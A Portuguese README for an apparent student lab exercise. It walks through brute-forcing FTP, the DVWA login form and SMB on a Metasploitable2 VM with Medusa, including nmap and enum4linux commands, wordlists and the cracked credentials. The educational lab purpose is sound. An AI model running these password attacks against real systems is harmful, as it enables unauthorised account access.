# Desafio1_SimulandoAtaqueBruteForce
Este repositório reúne um guia prático, scripts e wordlists para montar um laboratório com Kali Linux e Metasploitable2, executar cenários controlados de força bruta (FTP, formulário web, SMB) usando o _Medusa_, e documentar resultados e recomendações de mitigação. Destinado a fins educacionais em ambiente autorizado.

### Teste 1 — Ataque de Força Bruta em FTP com Medusa

- **Data:** 22/10/2025
- **Alvo:** 192.168.56.102
- **Serviço:** FTP (vsftpd 2.3.4)
- **Porta:** 21/tcp
- **Ferramenta:** Medusa v2.3

#### Objetivo:
Realizar ataque de força bruta simples contra o serviço FTP da Metasploitable2 utilizando usuário conhecido (`msfadmin`) e wordlist de senhas comuns.

#### Comando utilizado para análise e identificação de serviços vulneráveis no alvo:
nmap -sS -sV -O -Pn 192.168.56.102 -oN nmap_basico.txt

#### Wordlist utilizada:
wordlist_small.txt (conteúdo):
1. msfadmin
2. password
3. 123456
4. admin
5. guest
6. toor
7. letmein

#### Comando executado:
medusa -h 192.168.56.102 -u msfadmin -P wordlist_small.txt -M ftp -t 8 -f -v 6

#### Resultado: 
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin

### Teste 2  — Brute Force em Formulário Web (DVWA)

**Data:** 22/10/2025
**Alvo:** 192.168.56.102
**Serviço:** Metasploitable 2 com DVWA ativo
**Porta:** HTTP (porta 80)
**Ferramenta:** Medusa v2.3

### Objetivo:
Realizar ataque de brute force simples contra o serviço FTP da Metasploitable 2 utilizando usuário conhecido (msfadmin) e wordlist de senhas comuns.

### Comando executado:
medusa -h 192.168.56.102 -u admin -P /home/kali/projetos/medusa-lab/wordlists/wordlist_small.txt \
-M web-form -m '/dvwa/login.php?username=^USER^&password=^PASS^&Login=Login:!Login failed' -t 5 -f

### Resultado:
ACCOUNT FOUND: [web-form] Host: 192.168.56.102 User: admin Password: password [SUCCESS]

### Teste 3  — Password Spraying no Serviço SMB

**Data:** 22/10/2025
**Alvo:** 192.168.56.102
**Serviço:** SMB
**Porta:** Porta 445
**Ferramenta:** Medusa v2.3

### Enumeração:
enum4linux -a 192.168.56.102 | tee smb_enum.txt

### Criação de wordlists (Users e passwords):
**Users:** echo -e "msfadmin\nguest\nuser\npostgres\nroot" > /home/kali/projetos/medusa-lab/wordlists/users.txt
**Passwords:** echo -e "123456\npassword\ntoor\nmsfadmin\ndvwa" > /home/kali/projetos/medusa-lab/wordlists/passwords.txt

### Comando executado:
medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M smbnt -t 5 -f

### Resultado:
2025-10-22 21:53:27 ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]





